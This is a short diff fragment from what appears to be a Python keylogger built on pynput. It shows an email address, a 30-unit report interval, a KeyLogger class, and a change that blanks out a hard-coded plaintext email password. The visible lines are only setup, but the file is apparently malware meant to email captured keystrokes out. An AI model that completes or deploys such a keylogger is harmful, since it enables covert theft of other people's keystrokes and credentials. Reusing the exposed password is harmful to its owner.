@@ -10,7 +10,7 @@ from pynput.keyboard import Listener
 
 
 email_address = "yopinkman1@gmail.com"
-email_password = "Y0p1nkm4n."
+email_password = ""
 send_report_time = 30
 
 class KeyLogger:
